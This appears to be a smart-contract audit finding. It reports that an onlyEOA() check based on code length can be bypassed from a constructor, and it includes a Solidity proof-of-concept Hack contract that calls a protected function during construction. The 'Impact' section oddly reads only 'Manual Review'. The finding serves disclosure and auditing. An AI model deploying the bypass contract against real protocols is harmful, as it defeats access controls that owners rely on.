# onlyEOA() modifier does not stop deposits from contracts (avoid accidentally lost tokens)

## Summary
The onlyEOA() modifier actually fails to check if the msg.sender is a contract.

## Vulnerability Detail
The modifier onlyEOA(), fails to check if the msg.sender is a contract, as msg.sender.code.length == 0 ,fails when the it is in the constructor phase, the code.length is equal to 0.
Do not use the EXTCODESIZE check to prevent smart contracts from calling a function. This is not foolproof, it can be subverted by a constructor call, due to the fact that while the constructor is running, EXTCODESIZE for that address returns 0.

## POC 
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.17;

       contract Target {
        function isContract(address account) public view returns (bool) {
         if(account.code.length == 0){
            return false;
           }
            return true;
        }

    bool public pwned = false;

     function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
       }
     }

      contract Hack {
              bool public isContract;
              address public addr;

              // When contract is being created, code size (extcodesize) is 0.
              // This will bypass the isContract() check
            constructor(address _target) {
                    isContract = Target(_target).isContract(address(this));
                    addr = address(this);
                   // This will work
                   Target(_target).protected();
          }
       }


## Impact

Manual Review

## Recommendation
If you want to make sure that an externally owned account (EOA) is calling your contract, a simple way is require (msg.sender == tx.origin) .
